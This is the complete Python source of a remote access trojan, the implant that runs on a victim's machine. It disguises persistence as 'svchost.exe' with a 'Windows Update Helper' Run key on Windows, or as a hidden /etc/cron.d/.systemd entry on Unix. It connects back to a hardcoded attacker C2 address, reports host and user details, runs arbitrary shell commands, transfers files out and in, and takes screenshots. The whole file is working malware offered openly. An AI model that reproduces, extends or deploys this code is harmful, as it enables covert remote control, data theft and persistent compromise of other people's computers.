import socket
import subprocess
import os
import sys
import json
import time
import platform
import shutil
import threading
import hashlib
from pathlib import Path
import zlib
import ctypes
import ctypes.wintypes

# Platform-agnostic configuration
C2_HOST = '192.168.100.15'  # Attacker C2 IP
C2_PORT = 443
RECONNECT_INTERVAL = 10
MAX_FILE_CHUNK = 4096 * 16
SCREENSHOT_QUALITY = 70


class VictimServer:
    def __init__(self):
        self.platform = platform.system().lower()
        self.session_id = hashlib.sha256(os.urandom(16)).hexdigest()
        self.lock = threading.Lock()
        self.running = True
        self.sock = None
        self.is_admin = self.check_admin_privileges()
        self.persist()

    def check_admin_privileges(self):
        """Cross-platform admin check"""
        if self.platform == 'windows':
            try:
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            except:
                return False
        else:
            return os.getuid() == 0  # UNIX-like systems

    def persist(self):
        """Cross-platform persistence"""
        try:
            if self.platform == 'windows':
                exe_path = os.path.join(os.getenv('APPDATA'), 'svchost.exe')
                if not os.path.exists(exe_path):
                    shutil.copy2(sys.argv[0], exe_path)
                    subprocess.check_call(
                        'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                        '/v "Windows Update Helper" /t REG_SZ /d "{}" /f'.format(exe_path),
                        shell=True,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
            else:
                cron_path = '/etc/cron.d/.systemd'
                if not os.path.exists(cron_path):
                    with open(cron_path, 'w') as f:
                        f.write(f'@reboot /usr/bin/python3 {sys.argv[0]}\n')
                    os.chmod(cron_path, 0o644)
        except Exception as e:
            pass

    def connect_c2(self):
        """Connection handler with improved error reporting"""
        while self.running:
            try:
                print(f"[*] Attempting connection to {C2_HOST}:{C2_PORT}")
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((C2_HOST, C2_PORT))
                self._safe_send(self.session_id.encode())
                print(f"[+] Connected to {C2_HOST}:{C2_PORT}")
                return True
            except Exception as e:
                print(f"[-] Connection failed: {str(e)}")
                time.sleep(RECONNECT_INTERVAL)
        return False

    def send_system_info(self):
        """Send platform-agnostic system information"""
        info = {
            'id': self.session_id,
            'os': self.platform,
            'hostname': platform.node(),
            'user': os.getenv('USERNAME') or os.getenv('USER'),
            'privilege': 'admin' if self.is_admin else 'user'
        }
        self._safe_send(json.dumps(info).encode())

    def handle_commands(self):
        """Main command loop"""
        while self.running:
            try:
                command = self._safe_recv()
                if not command:
                    continue

                print(f"[*] Received command: {command[:50]}...")

                if command.startswith(b'DL '):
                    self.handle_download(command)
                elif command.startswith(b'UL '):
                    self.handle_upload(command)
                elif command == b'SCREENSHOT':
                    self.handle_screenshot()
                elif command.startswith(b'PERSIST '):
                    self._safe_send(b"Persistence installed")
                elif command.startswith(b'STEALTH '):
                    mode = command.split(b' ', 1)[1].decode()
                    self._safe_send(f"Stealth mode: {mode}".encode())
                elif command == b'KILL':
                    self.self_destruct()
                elif command.startswith(b'CMD '):
                    self.handle_shell_command(command[4:])  # Remove "CMD " prefix
                else:
                    self._safe_send(b"Unknown command")

            except Exception as e:
                print(f"[!] Command error: {str(e)}")
                if self.running:
                    self.connect_c2()

    def handle_screenshot(self):
        """Cross-platform screenshot handling"""
        try:
            from PIL import ImageGrab  # Ensure pillow library is installed
            filename = f"/tmp/screenshot_{int(time.time())}.jpg"
            ImageGrab.grab().save(filename, quality=SCREENSHOT_QUALITY)
            self.send_file(filename)
            os.remove(filename)
        except ImportError:
            self._safe_send(b"Screenshot requires PIL library")
        except Exception as e:
            self._safe_send(f"Screenshot failed: {str(e)}".encode())

    def _calculate_hash(self, path):
        """Calculate SHA-256 hash of a file"""
        sha = hashlib.sha256()
        with open(path, 'rb') as f:
            while True:
                chunk = f.read(4096)
                if not chunk:
                    break
                sha.update(chunk)
        return sha.hexdigest()

    def handle_shell_command(self, command):
        """Execute system commands safely"""
        try:
            cmd_str = command.decode('utf-8')
            proc = subprocess.Popen(
                cmd_str,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            stdout, stderr = proc.communicate(timeout=30)
            output = stdout or stderr or b"No output"
            self._safe_send(output)
        except Exception as e:
            self._safe_send(f"Command failed: {e}".encode())

    def handle_download(self, command):
        """File download handler"""
        try:
            cmd_str = command.decode('utf-8')  # Decode bytes to string first
            file_path = cmd_str.split(' ', 1)[1]  # Now split the string
            if not os.path.exists(file_path):
                self._safe_send(b"File not found")
                return
            self.send_file(file_path)
        except Exception as e:
            self._safe_send(f"Download error: {e}".encode())

    def handle_upload(self, command):
        """File upload handler"""
        try:
            cmd_str = command.decode('utf-8')
            remote_path = cmd_str.split(' ', 1)[1]
            self.receive_file(remote_path)
        except Exception as e:
            self._safe_send(f"Upload error: {e}".encode())

    def send_file(self, file_path):
        """Secure file transfer protocol"""
        try:
            # Send metadata
            file_hash = self._calculate_hash(file_path)
            metadata = json.dumps({
                'name': os.path.basename(file_path),
                'size': os.path.getsize(file_path),
                'hash': file_hash
            })
            self._safe_send(metadata.encode())

            # Wait for ACK
            if self._safe_recv() != b"ACK":
                return

            # Send file content
            with open(file_path, 'rb') as f:
                while True:
                    chunk = f.read(MAX_FILE_CHUNK)
                    if not chunk:
                        break
                    self._safe_send(zlib.compress(chunk))

            # Final verification
            if self._safe_recv() == b"VER":
                self._safe_send(file_hash.encode())

        except Exception as e:
            self._safe_send(f"File error: {str(e)}".encode())

    def receive_file(self, file_path):
        """Secure file reception protocol"""
        try:
            metadata = json.loads(self._safe_recv().decode())
            self._safe_send(b"ACK")

            received = 0
            file_hash = hashlib.sha256()
            with open(file_path, 'wb') as f:
                while received < metadata['size']:
                    data = zlib.decompress(self._safe_recv())
                    f.write(data)
                    file_hash.update(data)
                    received += len(data)

            # Verify integrity
            if file_hash.hexdigest() == metadata['hash']:
                self._safe_send(b"File received successfully")
            else:
                os.remove(file_path)
                self._safe_send(b"File verification failed")

        except Exception as e:
            self._safe_send(f"Upload error: {str(e)}".encode())

    def _safe_send(self, data):
        """Thread-safe sending with error handling"""
        with self.lock:
            try:
                if isinstance(data, str):
                    data = data.encode()
                header = len(data).to_bytes(4, 'big')
                self.sock.sendall(header + data)
            except Exception as e:
                print(f"[!] Send error: {str(e)}")
                self.running = False

    def _safe_recv(self):
        """Thread-safe receiving with error handling"""
        try:
            header = self.sock.recv(4)
            if not header:
                return None
            length = int.from_bytes(header, 'big')
            data = bytearray()
            while len(data) < length:
                packet = self.sock.recv(min(4096, length - len(data)))
                if not packet:
                    return None
                data.extend(packet)
            return bytes(data)
        except Exception as e:
            print(f"[!] Receive error: {str(e)}")
            return None

    def self_destruct(self):
        """Cleanup and exit"""
        try:
            if self.platform == 'windows':
                subprocess.run(
                    'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                    '/v "Windows Update Helper" /f',
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                os.remove(os.path.join(os.getenv('APPDATA'), 'svchost.exe'))
            else:
                os.remove('/etc/cron.d/.systemd')
        finally:
            self.running = False
            sys.exit(0)

    def start(self):
        """Main execution flow"""
        while self.running:
            if self.connect_c2():
                self.send_system_info()
                self.handle_commands()


if __name__ == '__main__':
    server = VictimServer()
    server.start()